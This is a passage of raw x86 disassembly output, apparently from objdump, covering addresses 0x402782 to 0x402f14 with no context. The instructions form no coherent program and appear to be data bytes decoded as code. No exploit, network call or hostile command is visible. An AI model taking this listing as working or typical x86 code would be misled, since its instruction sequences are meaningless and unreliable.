  402782:	sub    al,cl
  402784:	adc    al,0x14
  402786:	add    DWORD PTR [eax+0xcd50082],ebx
  40278c:	add    ebp,DWORD PTR [eax]
  40278e:	xor    DWORD PTR [ebp+0x30],ecx
  402791:	and    eax,ebx
  402793:	mov    al,ds:0x9d040052
  402798:	push   eax
  402799:	push   ss
  40279a:	leave  
  40279b:	and    dl,al
  40279d:	and    DWORD PTR [eax],edx
  40279f:	pusha  
  4027a0:	add    ah,BYTE PTR [esi]
  4027a2:	inc    eax
  4027a3:	inc    eax
  4027a4:	add    al,0x50
  4027a6:	add    al,0xa0
  4027a8:	and    BYTE PTR [edx],0x74
  4027ab:	add    BYTE PTR [eax+0x47],al
  4027ae:	add    BYTE PTR [edx],al
  4027b0:	and    BYTE PTR [ecx+0xcc20080],al
  4027b6:	inc    esi
  4027b7:	push   esp
  4027b8:	add    al,0x0
  4027ba:	or     al,BYTE PTR [ecx]
  4027bc:	and    al,0x88
  4027be:	or     BYTE PTR fs:[ebx],0x11
  4027c2:	adc    BYTE PTR [eax+edx*1],dl
  4027c5:	inc    eax
  4027c6:	test   BYTE PTR [eax-0x80],al
  4027c9:	cmp    BYTE PTR [eax],cl
  4027cb:	sub    cl,BYTE PTR [ebx]
  4027cd:	adc    BYTE PTR [eax-0x7d7eb65e],0x61
  4027d4:	and    ah,BYTE PTR [eax+edx*2]
  4027d7:	xor    BYTE PTR [ebx],cl
  4027d9:	or     DWORD PTR [eax],ecx
  4027db:	sub    BYTE PTR [esi],al
  4027dd:	inc    ebx
  4027de:	add    eax,0xa2039134
  4027e3:	in     al,0x80
  4027e5:	add    DWORD PTR [eax+0x44d29211],eax
  4027eb:	mov    al,ds:0xc0d8044
  4027f0:	or     BYTE PTR [eax+0x1410a04],dl
  4027f6:	mov    BYTE PTR [ecx],dl
  4027f8:	or     BYTE PTR [eax-0x6c],dh
  4027fb:	add    BYTE PTR [eax],ah
  4027fd:	inc    eax
  4027fe:	add    al,cl
  402800:	add    BYTE PTR [ecx+0x424c8001],ah
  402806:	add    al,0x10
  402808:	add    DWORD PTR [eax],edx
  40280a:	adc    edx,DWORD PTR ds:0x1317a25
  402810:	xor    BYTE PTR [eax],al
  402812:	and    BYTE PTR [eax+eiz*1],dl
  402815:	or     DWORD PTR [edx],eax
  402817:	or     al,0x8
  402819:	or     eax,esp
  40281b:	mov    al,0xc2
  40281d:	pop    eax
  40281e:	add    BYTE PTR [ecx],ah
  402820:	or     BYTE PTR [ecx-0x75ffdbcc],al
  402826:	push   ds
  402827:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402829:	adc    al,al
  40282b:	adc    al,bl
  40282d:	sub    BYTE PTR [eax],0x39
  402830:	and    BYTE PTR [eax],al
  402832:	cmp    DWORD PTR [eax-0x6f1fff7c],esp
  402838:	cwde   
  402839:	add    ch,BYTE PTR [ecx]
  40283b:	add    BYTE PTR [eax],dl
  40283d:	add    BYTE PTR [ecx],al
  40283f:	fs gs inc esp
  402842:	xchg   esp,eax
  402843:	adc    BYTE PTR [ecx+ebx*4+0x4608b050],dl
  40284a:	adc    BYTE PTR [ebp+0x9801102],dl
  402850:	adc    BYTE PTR [eax],0x8e
  402853:	ret    0x5484
  402856:	or     al,0x12
  402858:	adc    BYTE PTR [eax+0x4],al
  40285b:	xchg   ecx,eax
  40285c:	and    BYTE PTR [esi],ah
  40285e:	push   cs
  40285f:	adc    ecx,DWORD PTR [eax+0x56106cc2]
  402865:	add    BYTE PTR [edx],al
  402867:	inc    edx
  402868:	or     ecx,DWORD PTR [eax]
  40286a:	outs   dx,DWORD PTR ds:[esi]
  40286b:	dec    ecx
  40286c:	sub    BYTE PTR [ecx],cl
  40286e:	xor    eax,0x44408202
  402873:	or     BYTE PTR [eax+0x21],al
  402876:	mov    esp,0x8405a0aa
  40287b:	add    BYTE PTR [ebx+0x6],bh
  40287e:	add    BYTE PTR [esi+eiz*1],ah
  402881:	add    al,BYTE PTR [eax]
  402883:	xchg   ecx,eax
  402884:	sbb    al,BYTE PTR [eax+ecx*1]
  402887:	and    eax,0x4cc01022
  40288c:	pop    edx
  40288d:	add    DWORD PTR [esi],edx
  40288f:	xor    BYTE PTR [eax+0x0],ch
  402892:	pop    esp
  402893:	and    al,0x0
  402895:	dec    ecx
  402896:	or     eax,0x4d98500
  40289b:	pusha  
  40289c:	sbb    ah,BYTE PTR [edx-0x70]
  40289f:	push   0x3e014c11
  4028a4:	add    cl,BYTE PTR [eax-0x64]
  4028a7:	les    esp,FWORD PTR [ecx]
  4028a9:	and    al,0x50
  4028ab:	add    BYTE PTR [ecx],cl
  4028ad:	rol    BYTE PTR [ebp+eiz*1+0x40],0x13
  4028b2:	pop    es
  4028b3:	sbb    BYTE PTR [eax],ah
  4028b5:	dec    ebx
  4028b6:	and    DWORD PTR [ecx+0x20],eax
  4028b9:	add    BYTE PTR [eax-0x7e847970],dl
  4028bf:	add    BYTE PTR [eax],ah
  4028c1:	inc    esp
  4028c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028c3:	and    ch,BYTE PTR [eax]
  4028c5:	rol    BYTE PTR [ecx+0x100c80a4],0x42
  4028cc:	sub    BYTE PTR [edx+0x2b],0x0
  4028d0:	mov    al,al
  4028d2:	add    al,0x34
  4028d4:	or     DWORD PTR [bx+si],ebp
  4028d7:	pusha  
  4028d8:	add    BYTE PTR [edx],al
  4028da:	test   BYTE PTR [ecx+0xe],cl
  4028dd:	les    edi,FWORD PTR [edx+0x400415d0]
  4028e3:	adc    DWORD PTR [eax],edx
  4028e5:	push   0xffffff88
  4028e7:	mov    al,ds:0x1b24854a
  4028ec:	mov    al,0x1
  4028ee:	fwait
  4028ef:	or     al,0x5
  4028f1:	adc    BYTE PTR [ecx],dl
  4028f3:	or     ah,BYTE PTR [eax+0x2106002a]
  4028f9:	or     al,BYTE PTR [eax]
  4028fb:	or     DWORD PTR [ecx],0x1090142c
  402901:	or     eax,0x4f488000
  402906:	add    BYTE PTR [edx],al
  402908:	adc    BYTE PTR [eax+0x40],0x2
  40290c:	push   edx
  40290d:	adc    DWORD PTR [eax+ecx*2+0x44143800],esp
  402914:	inc    eax
  402915:	add    BYTE PTR [esp+0x1b],0x48
  40291a:	sub    BYTE PTR [ecx],0x6d
  40291d:	adc    BYTE PTR [eax+0x14],al
  402920:	add    BYTE PTR [esp],0x41
  402924:	jp     0x4028b8
  402926:	and    al,BYTE PTR [ecx]
  402928:	xor    ch,al
  40292a:	add    DWORD PTR [ecx-0x7b],esi
  40292d:	and    BYTE PTR [ebx],cl
  40292f:	add    BYTE PTR [eax],cl
  402931:	add    al,0x40
  402933:	or     BYTE PTR [eax],0x54
  402936:	and    al,0x40
  402938:	adc    bl,BYTE PTR [eax]
  40293a:	nop
  40293b:	inc    edi
  40293c:	mov    cl,BYTE PTR [ecx+0xc430214]
  402942:	add    al,0x48
  402944:	add    BYTE PTR [eax],dh
  402946:	add    DWORD PTR [eax*4-0x3aa5c700],ecx
  40294d:	or     DWORD PTR [eax],eax
  40294f:	and    BYTE PTR [eax],0x2c
  402952:	add    eax,0xb2148100
  402957:	cmp    BYTE PTR [eax],0x0
  40295a:	and    BYTE PTR [eax],0x4c
  40295d:	fs add eax,0x22f48082
  402963:	nop
  402964:	adc    DWORD PTR [edx+0x40],0xb5740101
  40296b:	add    BYTE PTR [eax],al
  40296d:	add    BYTE PTR [ecx],al
  40296f:	add    BYTE PTR [esi-0x7f3fffdf],al
  402975:	add    BYTE PTR [edx],0x8
  402978:	add    DWORD PTR [eax-0x1c],0x376d02a0
  40297f:	adc    cl,BYTE PTR [edx-0x80]
  402982:	les    eax,FWORD PTR [ecx]
  402984:	test   BYTE PTR [eax],ah
  402986:	xor    al,0x2b
  402988:	add    al,0x18
  40298a:	fisubr DWORD PTR [eax]
  40298c:	das    
  40298d:	mov    BYTE PTR [eax],ah
  40298f:	add    BYTE PTR [esp+0x2],al
  402993:	adc    BYTE PTR [ecx],0x1a
  402996:	push   cs
  402997:	add    al,0x7c
  402999:	pushf  
  40299a:	add    cl,BYTE PTR [edx+0x260010c1]
  4029a0:	or     BYTE PTR [ecx],dl
  4029a2:	inc    edx
  4029a3:	adc    BYTE PTR [ecx],0x10
  4029a6:	add    BYTE PTR [eax],ah
  4029a8:	push   eax
  4029a9:	aas    
  4029aa:	mov    cl,BYTE PTR [ebx+0x78283924]
  4029b0:	or     al,BYTE PTR [edx+0x2]
  4029b3:	add    BYTE PTR ds:0x20903020,cl
  4029b9:	inc    ebx
  4029ba:	inc    eax
  4029bb:	cs inc eax
  4029bd:	add    esp,DWORD PTR gs:[eax+0x20]
  4029c1:	and    BYTE PTR [edx],ah
  4029c3:	jae    0x402a0b
  4029c5:	pusha  
  4029c6:	push   ebx
  4029c7:	add    eax,0x56802922
  4029cc:	or     dl,BYTE PTR [edx+0x4c30a00]
  4029d2:	or     BYTE PTR [eax+0x15],cl
  4029d5:	add    BYTE PTR [ecx+edi*4+0x2188c0b3],al
  4029dc:	dec    eax
  4029dd:	or     BYTE PTR [ebp-0x80],cl
  4029e0:	fadd   st,st(0)
  4029e2:	add    BYTE PTR [ebx+0x502210cb],bh
  4029e8:	mov    al,ds:0x3818000
  4029ed:	sbb    dl,BYTE PTR [eax]
  4029ef:	and    ecx,DWORD PTR [eax]
  4029f1:	add    BYTE PTR [eax+0x44a850],ch
  4029f7:	xor    BYTE PTR [esp+eax*1],dl
  4029fa:	add    cl,cl
  4029fc:	or     DWORD PTR [eax],edx
  4029fe:	or     al,0x19
  402a00:	inc    esp
  402a01:	pusha  
  402a02:	pop    eax
  402a03:	adc    DWORD PTR [edx],esp
  402a05:	dec    eax
  402a06:	add    BYTE PTR [ecx-0x48],al
  402a09:	push   ss
  402a0a:	add    al,0x61
  402a0c:	or     DWORD PTR [ebx],eax
  402a0e:	mov    DWORD PTR [ecx],eax
  402a10:	add    BYTE PTR [ebx],0x1
  402a13:	xlat   BYTE PTR ds:[ebx]
  402a14:	sub    BYTE PTR [eax+0x21],bh
  402a17:	sbb    dl,al
  402a19:	sbb    DWORD PTR [esp+ecx*1],ecx
  402a1c:	adc    al,BYTE PTR ds:0x420c4406
  402a22:	test   BYTE PTR [esp+eax*4],al
  402a25:	or     BYTE PTR [ecx+0x4],al
  402a28:	add    BYTE PTR [eax],dl
  402a2a:	mov    al,ds:0xa2000c
  402a2f:	and    BYTE PTR [eax],cl
  402a31:	mov    bl,0xa
  402a33:	add    al,BYTE PTR [eax+0x21800101]
  402a39:	add    BYTE PTR ds:0x94222c4,al
  402a3f:	and    DWORD PTR [eax+0x40308a44],edx
  402a45:	sub    BYTE PTR [eax-0x55],al
  402a48:	ins    DWORD PTR es:[edi],dx
  402a49:	adc    al,BYTE PTR [eax+0x54]
  402a4c:	inc    ecx
  402a4d:	adc    al,0x8
  402a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a50:	daa    
  402a51:	add    BYTE PTR [eax+0xc23458],al
  402a57:	add    BYTE PTR [eax],dh
  402a59:	inc    eax
  402a5a:	push   eax
  402a5b:	inc    eax
  402a5c:	adc    BYTE PTR [eax],al
  402a5e:	sub    BYTE PTR [ebx-0x5a],bl
  402a61:	add    DWORD PTR [ecx+0x11],edi
  402a64:	and    al,0x4
  402a66:	inc    edx
  402a67:	adc    BYTE PTR [eax+0x300681c4],bl
  402a6d:	sub    BYTE PTR [edx-0x78],al
  402a70:	test   BYTE PTR [ebx-0x7fffa000],ah
  402a76:	add    BYTE PTR [edx],al
  402a78:	add    BYTE PTR [edx-0x7c3ffecf],bh
  402a7e:	or     BYTE PTR [eax+0x39],0x1
  402a82:	pusha  
  402a83:	or     BYTE PTR [edx+eiz*1+0x76],al
  402a87:	push   es
  402a88:	mov    WORD PTR [edx-0x23f3ae7d],ss
  402a8e:	cwde   
  402a8f:	adc    eax,DWORD PTR [eax]
  402a91:	sub    BYTE PTR [esi+0x4140050],al
  402a97:	adc    DWORD PTR [ebx],eax
  402a99:	xchg   edx,eax
  402a9a:	and    BYTE PTR [eax],0xe
  402a9d:	and    BYTE PTR [ebx],0x1d
  402aa0:	and    ah,BYTE PTR [eax]
  402aa2:	dec    ecx
  402aa3:	aam    0x54
  402aa5:	rol    eax,0x6
  402aa8:	xchg   esp,eax
  402aa9:	shl    BYTE PTR [eax+0xaa01010],0x0
  402ab0:	add    edx,ecx
  402ab2:	rol    DWORD PTR [edx+0x26],0x1
  402ab6:	or     BYTE PTR ds:0x404dd102,al
  402abc:	add    eax,DWORD PTR [esp+edx*1-0x3ffdce56]
  402ac3:	nop
  402ac4:	and    BYTE PTR [edx],al
  402ac6:	mov    BYTE PTR [esi+0x230440],ah
  402acc:	mov    BYTE PTR [eax],dl
  402ace:	or     dl,BYTE PTR [edx]
  402ad0:	add    ebp,DWORD PTR [eax+0x2060a90]
  402ad6:	inc    edx
  402ad7:	sbb    eax,DWORD PTR [eax]
  402ad9:	mov    BYTE PTR [eax],ah
  402adb:	push   es
  402adc:	adc    BYTE PTR [eax+0x39],0xb0
  402ae0:	sub    eax,0x1000010
  402ae5:	nop
  402ae6:	add    al,0xa1
  402ae8:	add    DWORD PTR [ecx*2+0x40f2931],eax
  402aef:	rol    BYTE PTR [eax+0x0],0xc1
  402af3:	and    eax,0xc908c088
  402af8:	pusha  
  402af9:	and    BYTE PTR [ecx-0x7ffb5e77],al
  402aff:	and    al,BYTE PTR [eax+0xa70070]
  402b05:	dec    eax
  402b06:	xchg   BYTE PTR [ecx+0x6031030c],al
  402b0c:	add    DWORD PTR [edi],edx
  402b0e:	adc    eax,0x63400184
  402b13:	inc    edx
  402b14:	les    edx,FWORD PTR [eax+0x202801]
  402b1a:	push   ss
  402b1b:	jo     0x402b3e
  402b1d:	adc    DWORD PTR [eax+0x4ed83a20],ebx
  402b23:	sbb    al,0x4
  402b25:	adc    BYTE PTR [eax+0x434005c0],0x2
  402b2c:	nop
  402b2d:	add    al,BYTE PTR [ecx+0x62]
  402b30:	inc    ebx
  402b31:	inc    ecx
  402b32:	and    al,0x38
  402b34:	inc    edx
  402b35:	inc    eax
  402b36:	or     al,0x2
  402b38:	or     eax,DWORD PTR [ecx+0x10]
  402b3b:	and    DWORD PTR [eax],edx
  402b3d:	inc    esi
  402b3e:	add    dl,BYTE PTR [ecx+0x28]
  402b41:	mov    DWORD PTR [eax],edx
  402b43:	inc    eax
  402b44:	inc    ecx
  402b45:	adc    dl,BYTE PTR [eax]
  402b47:	adc    al,0xa0
  402b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4a:	or     BYTE PTR [eax+0x2a400a0a],ah
  402b50:	add    BYTE PTR [eax],al
  402b52:	or     al,BYTE PTR [ecx]
  402b54:	sbb    DWORD PTR [edx],eax
  402b56:	add    eax,0x40a8284
  402b5b:	pusha  
  402b5c:	push   ebp
  402b5d:	push   es
  402b5e:	add    BYTE PTR [edx],cl
  402b60:	mov    al,ds:0x3c490180
  402b65:	adc    DWORD PTR [eax+0x6],esi
  402b68:	and    al,0xa
  402b6a:	xor    dl,BYTE PTR [edx+0x11]
  402b6d:	cld    
  402b6e:	inc    ecx
  402b6f:	add    dl,BYTE PTR [ecx]
  402b71:	and    BYTE PTR [ecx],cl
  402b73:	pusha  
  402b74:	add    al,0x8
  402b76:	sub    al,0x84
  402b78:	add    esp,esp
  402b7a:	or     eax,0x98506200
  402b7f:	add    al,0x19
  402b81:	add    al,0x62
  402b83:	add    BYTE PTR [eax],cl
  402b85:	rcl    BYTE PTR [ecx+edx*1-0x7f],1
  402b89:	or     DWORD PTR [ecx+eax*1],eax
  402b8c:	nop
  402b8d:	add    BYTE PTR [edx+0x2029000a],bl
  402b93:	add    DWORD PTR [ecx],eax
  402b95:	mov    al,BYTE PTR [eax-0x7affde80]
  402b9b:	add    BYTE PTR [edx],al
  402b9d:	add    dh,BYTE PTR [eax]
  402b9f:	mov    BYTE PTR [eax],cl
  402ba1:	add    DWORD PTR [esi],ecx
  402ba3:	inc    eax
  402ba4:	add    al,BYTE PTR [ebx+0x60]
  402ba7:	add    BYTE PTR ds:0xf1c50931,al
  402bad:	mov    eax,ds:0x28119540
  402bb2:	mov    BYTE PTR [ebx+0x41],ah
  402bb5:	mov    BYTE PTR [edx],ah
  402bb7:	add    BYTE PTR [eax-0x77ab777c],al
  402bbd:	repz rol DWORD PTR [edx],0x40
  402bc1:	or     BYTE PTR [eax],ah
  402bc3:	mov    al,BYTE PTR [eax+0x66]
  402bc6:	add    BYTE PTR [eax+0x400020b2],cl
  402bcc:	and    al,BYTE PTR [edx-0x7e]
  402bcf:	inc    edx
  402bd0:	adc    BYTE PTR [eax],0x40
  402bd3:	push   eax
  402bd4:	add    DWORD PTR [ebp+0x11],ebp
  402bd7:	add    edx,DWORD PTR [eax]
  402bd9:	sub    BYTE PTR [eax],al
  402bdb:	add    BYTE PTR [edx-0x78],al
  402bde:	aam    0x13
  402be0:	add    BYTE PTR [ecx],cl
  402be2:	sub    BYTE PTR [ecx],dh
  402be4:	rol    DWORD PTR [eax+0x1],0x20
  402be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402be9:	inc    edx
  402bea:	rol    DWORD PTR [eax],0x1
  402bed:	or     BYTE PTR [edx+0x42],0xa2
  402bf1:	add    BYTE PTR [edx+0x24],dl
  402bf7:	or     eax,DWORD PTR [edx]
  402bf9:	inc    edx
  402bfa:	dec    edx
  402bfb:	sbb    DWORD PTR [ebx+0x1451a2],eax
  402c01:	or     ch,BYTE PTR [ecx]
  402c03:	inc    ebp
  402c04:	dec    edx
  402c05:	lea    esp,[ecx]
  402c07:	adc    ah,BYTE PTR [edx]
  402c09:	inc    eax
  402c0a:	dec    eax
  402c0b:	add    dl,BYTE PTR [eax]
  402c0d:	dec    esp
  402c0e:	inc    esp
  402c0f:	pusha  
  402c10:	adc    al,0x10
  402c12:	add    eax,0x65210d20
  402c17:	sbb    DWORD PTR ds:0x800023,0x9440b4
  402c21:	inc    eax
  402c22:	add    eax,DWORD PTR [edx]
  402c24:	add    al,BYTE PTR [ecx-0x7e]
  402c27:	or     BYTE PTR [eax],ah
  402c29:	push   esp
  402c2a:	xchg   ecx,eax
  402c2b:	push   ebp
  402c2c:	lds    eax,FWORD PTR [eax+0x5]
  402c2f:	bound  ecx,QWORD PTR [eax]
  402c31:	leave  
  402c32:	add    BYTE PTR fs:[eax+0x60],bh
  402c36:	adc    DWORD PTR [eax+0x2],edx
  402c39:	add    BYTE PTR [eax],dh
  402c3b:	inc    ecx
  402c3c:	enter  0x103,0x44
  402c40:	rol    BYTE PTR [eax],0x5
  402c43:	and    DWORD PTR [edx+0x6a02c12],edi
  402c49:	add    al,0x19
  402c4b:	adc    al,0x10
  402c4d:	nop
  402c4e:	add    dl,BYTE PTR ds:0x812b0019
  402c54:	adc    BYTE PTR [eax],ah
  402c56:	sub    al,dl
  402c58:	loop   0x402c5f
  402c5a:	push   es
  402c5b:	xor    cl,BYTE PTR [eax+0x203e0002]
  402c61:	adc    BYTE PTR [edx],al
  402c63:	stc    
  402c64:	mov    BYTE PTR [eax],ah
  402c66:	add    BYTE PTR [eax+0x7a190506],al
  402c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6d:	xor    al,0x80
  402c6f:	adc    al,BYTE PTR [eax+eax*1]
  402c72:	sbb    BYTE PTR [ebp+0x1],bl
  402c75:	add    BYTE PTR [esi+0x33],al
  402c78:	xchg   BYTE PTR [ebx+0x48119022],bl
  402c7e:	nop
  402c7f:	adc    BYTE PTR [eax],0x2
  402c82:	add    al,0xd2
  402c84:	add    BYTE PTR [edx],cl
  402c86:	ret    0x1d0
  402c89:	add    DWORD PTR [eax],eax
  402c8b:	mov    al,ds:0x28005c00
  402c90:	add    DWORD PTR [edx],ebx
  402c92:	test   BYTE PTR [eax+ecx*1],ch
  402c95:	sbb    DWORD PTR [ecx+0x52],esp
  402c98:	add    cl,al
  402c9a:	pusha  
  402c9b:	xor    BYTE PTR [edx+0x10],ch
  402c9e:	add    DWORD PTR [eax+ecx*8],esp
  402ca1:	xor    BYTE PTR [edi-0x6e],0xe0
  402ca5:	inc    edx
  402ca6:	add    al,0x61
  402ca8:	or     BYTE PTR [eax+0x9000180],dl
  402cae:	inc    eax
  402caf:	push   es
  402cb0:	add    edx,DWORD PTR [edx]
  402cb2:	add    BYTE PTR [edx+0x20],0x1
  402cb6:	add    DWORD PTR [eax],eax
  402cb8:	adc    edx,DWORD PTR [edx]
  402cba:	push   eax
  402cbb:	aaa    
  402cbc:	adc    BYTE PTR [ecx],bh
  402cbe:	xchg   ebx,eax
  402cbf:	rcl    BYTE PTR [eax+0x40],cl
  402cc2:	push   ecx
  402cc3:	ins    DWORD PTR es:[edi],dx
  402cc4:	adc    BYTE PTR [eax+0xc001000],al
  402cca:	and    ecx,DWORD PTR [eax]
  402ccc:	adc    eax,0x1a813022
  402cd1:	xchg   esp,eax
  402cd2:	je     0x402d07
  402cd4:	add    cl,BYTE PTR [esp+eax*1+0x18200004]
  402cdb:	xor    al,0x25
  402cdd:	and    DWORD PTR [eax+0x1],ecx
  402ce0:	add    eax,DWORD PTR ds:0x8314009
  402ce6:	push   eax
  402ce7:	xchg   BYTE PTR [ebx],cl
  402ce9:	mov    bl,0x0
  402ceb:	push   eax
  402cec:	cdq    
  402ced:	add    BYTE PTR [eax-0x4f9b7ffa],bh
  402cf3:	xor    DWORD PTR [edx+0x45],eax
  402cf6:	and    al,dl
  402cf8:	add    al,0x80
  402cfa:	nop
  402cfb:	inc    eax
  402cfc:	push   eax
  402cfd:	or     BYTE PTR [eax+0x6900dab8],al
  402d03:	or     DWORD PTR [ebp-0x5fe7ffec],eax
  402d09:	sub    DWORD PTR [esp+eax*1],0x14
  402d0d:	cmp    eax,0xc2a02511
  402d12:	ins    BYTE PTR es:[edi],dx
  402d13:	adc    DWORD PTR [ecx+eax*2],eax
  402d16:	and    al,0x8
  402d18:	xor    BYTE PTR [eax],cl
  402d1a:	rol    BYTE PTR [ecx],0x26
  402d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1e:	mov    al,ds:0x84490429
  402d23:	add    al,0x40
  402d25:	add    dh,BYTE PTR [edx]
  402d27:	add    eax,DWORD PTR [edx]
  402d29:	add    BYTE PTR [ecx+0x4],ch
  402d2c:	add    al,0x50
  402d2e:	xchg   ecx,eax
  402d2f:	sub    BYTE PTR [eax],dl
  402d31:	and    eax,0x88201421
  402d36:	test   BYTE PTR [ecx+0x14502],bl
  402d3c:	push   es
  402d3d:	jo     0x402d84
  402d3f:	mov    ds,WORD PTR [eax]
  402d41:	es push edx
  402d43:	mov    al,ds:0x67a28d08
  402d48:	and    DWORD PTR [edx],eax
  402d4a:	sbb    BYTE PTR [eax+0x1a0000],cl
  402d50:	add    DWORD PTR [edx+0x84807],eax
  402d56:	rcl    BYTE PTR [ecx],0x20
  402d59:	add    eax,0x800c1102
  402d5e:	xchg   ecx,eax
  402d5f:	xchg   BYTE PTR [eax+0xa00830],cl
  402d65:	dec    eax
  402d66:	push   es
  402d67:	pusha  
  402d68:	or     BYTE PTR [edx],ah
  402d6a:	inc    edx
  402d6b:	xor    BYTE PTR [eax+0x2cb1a80],0x20
  402d72:	loopne 0x402d39
  402d74:	dec    ecx
  402d75:	add    BYTE PTR [eax],dl
  402d77:	pusha  
  402d78:	inc    edx
  402d79:	or     al,0x82
  402d7b:	add    al,BYTE PTR ds:0x82088310
  402d81:	loope  0x402d8d
  402d83:	add    BYTE PTR [eax],dl
  402d85:	adc    BYTE PTR [edx],al
  402d87:	ret    
  402d88:	or     DWORD PTR [esp+edx*4],esi
  402d8b:	add    DWORD PTR [eax],0xd
  402d8e:	xchg   edx,eax
  402d8f:	xchg   edx,eax
  402d90:	add    DWORD PTR [edx],eax
  402d92:	jecxz  0x402d94
  402d94:	mov    dl,0x87
  402d96:	and    BYTE PTR [ebx],0x4
  402d99:	push   edx
  402d9a:	and    BYTE PTR [eax],dl
  402d9c:	sub    BYTE PTR [edx],0x28
  402d9f:	nop
  402da0:	add    BYTE PTR [esi+eax*1+0x3201500],ch
  402da7:	mov    ah,0xa
  402da9:	and    ecx,eax
  402dab:	adc    dl,BYTE PTR [ecx]
  402dad:	xor    BYTE PTR [eax-0x7bbf1d70],dl
  402db3:	adc    BYTE PTR [eax],ah
  402db5:	sbb    cl,BYTE PTR [eax]
  402db7:	and    edi,DWORD PTR [edx]
  402db9:	push   eax
  402dba:	and    al,0x25
  402dbc:	and    al,al
  402dbe:	mov    al,ds:0x8135a056
  402dc3:	push   cs
  402dc4:	and    BYTE PTR [ecx],al
  402dc6:	fld    QWORD PTR [eax+ecx*2]
  402dc9:	adc    BYTE PTR [edx+ecx*4+0x38],al
  402dcd:	adc    BYTE PTR [eax+0x4102123],cl
  402dd3:	cwde   
  402dd4:	add    DWORD PTR [edi+eiz*1-0x3c],ecx
  402dd8:	dec    eax
  402dd9:	add    eax,0x202006b6
  402dde:	add    BYTE PTR [eax],0xe2
  402de1:	arpl   WORD PTR [esi],sp
  402de3:	inc    ecx
  402de4:	add    BYTE PTR [eax+0x78083928],al
  402dea:	and    BYTE PTR [eax],al
  402dec:	push   eax
  402ded:	inc    eax
  402dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402def:	and    ah,BYTE PTR [eax+eiz*4]
  402df2:	push   es
  402df3:	add    eax,0x9902051
  402df8:	ror    DWORD PTR [ebx-0x38],0x1
  402dfc:	xor    BYTE PTR [eax+0xe],dl
  402dff:	or     BYTE PTR [eax+ebp*4-0x5e],al
  402e03:	push   ebp
  402e04:	inc    edx
  402e05:	pop    es
  402e06:	or     eax,0xa04814a0
  402e0b:	inc    eax
  402e0c:	popa   
  402e0d:	out    0x44,al
  402e0f:	mov    WORD PTR [ebx+0x406ec200],es
  402e15:	add    BYTE PTR [edx],cl
  402e17:	dec    ecx
  402e18:	mov    DWORD PTR [ebx],eax
  402e1a:	add    BYTE PTR [eax-0x57fb76c0],ah
  402e20:	and    BYTE PTR [ebx],al
  402e22:	inc    edi
  402e23:	or     DWORD PTR [ebx+0x7b205202],eax
  402e29:	fwait
  402e2a:	and    al,BYTE PTR [ebx]
  402e2c:	add    BYTE PTR [eax+0x64],al
  402e2f:	and    al,0x0
  402e31:	add    DWORD PTR [eax+edx*1],ecx
  402e34:	inc    ebx
  402e35:	or     BYTE PTR [esi+0x6091444a],dh
  402e3b:	add    BYTE PTR [eax-0x79e77ffc],al
  402e41:	sbb    al,0xb4
  402e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e44:	add    BYTE PTR [eax],0x48
  402e47:	or     BYTE PTR [edx+0x840282],cl
  402e4d:	dec    eax
  402e4e:	xor    al,0xb4
  402e50:	mov    BYTE PTR [edx],al
  402e52:	xor    al,0x8
  402e54:	add    eax,0x8640380
  402e59:	add    BYTE PTR [eax],dh
  402e5b:	sub    BYTE PTR [edx+0x2000368],al
  402e61:	push   eax
  402e62:	add    BYTE PTR [edx],ah
  402e64:	in     al,0x4
  402e66:	add    DWORD PTR [eax],eax
  402e68:	push   es
  402e69:	call   0x4b517516
  402e6e:	popa   
  402e6f:	hlt    
  402e70:	adc    dl,BYTE PTR [ecx]
  402e72:	add    BYTE PTR [eax],al
  402e74:	sub    DWORD PTR [eax],eax
  402e76:	add    DWORD PTR [ebx-0x6fdfff70],0x2
  402e7d:	add    BYTE PTR [edi+0x0],cl
  402e80:	add    BYTE PTR [ecx+0x8],ah
  402e83:	sbb    BYTE PTR [ecx],ah
  402e85:	and    DWORD PTR [eax+0x481a2012],0x30a000e
  402e8f:	add    BYTE PTR [esp+edx*8],al
  402e92:	inc    ebp
  402e93:	rdtsc  
  402e95:	nop
  402e96:	lock add al,0x44
  402e99:	add    al,0x6
  402e9b:	add    BYTE PTR [eax+eax*4],al
  402e9e:	inc    edi
  402e9f:	add    BYTE PTR [eax+0x12],cl
  402ea2:	and    bl,BYTE PTR [ecx]
  402ea4:	bound  ecx,QWORD PTR [ecx+0x14020033]
  402eaa:	sub    BYTE PTR [esp+ebx*1],ah
  402ead:	mov    DWORD PTR [edi],edx
  402eaf:	adc    DWORD PTR [ecx+0x31221009],ecx
  402eb5:	inc    esp
  402eb6:	add    BYTE PTR [ebx+0xd20404],bl
  402ebc:	or     BYTE PTR [eax],al
  402ebe:	ret    0x285a
  402ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec2:	daa    
  402ec3:	leave  
  402ec4:	and    BYTE PTR [eax],bl
  402ec6:	or     DWORD PTR [eax],eax
  402ec8:	or     BYTE PTR [eax+0x2a1104e0],ah
  402ece:	add    DWORD PTR [ebp-0x7aa3fffe],ecx
  402ed4:	and    BYTE PTR [eax-0x376a982e],0x0
  402edb:	sub    DWORD PTR [eax],edx
  402edd:	add    BYTE PTR [esi+0x5812816a],al
  402ee3:	xchg   esp,eax
  402ee4:	push   0xc4d04440
  402ee9:	add    edx,DWORD PTR [eax]
  402eeb:	jmp    0x24f04b10
  402ef0:	add    BYTE PTR [ecx+0x0],ch
  402ef3:	add    al,0x8
  402ef5:	adc    DWORD PTR [ecx],ebp
  402ef7:	adc    DWORD PTR [eax],esp
  402ef9:	add    DWORD PTR [edx],esp
  402efb:	or     al,0x42
  402efd:	sub    al,BYTE PTR [eax]
  402eff:	add    DWORD PTR ds:0xcc1018b9,esp
  402f05:	test   BYTE PTR [eax+ebp*4],al
  402f08:	add    DWORD PTR [eax],ecx
  402f0a:	add    ch,BYTE PTR [eax+0x0]
  402f0d:	add    BYTE PTR [eax+0x4],0x11
  402f11:	rcl    DWORD PTR [ecx],0xe
  402f14:	add    DWORD PTR [edx+0x4ea8c44],esi
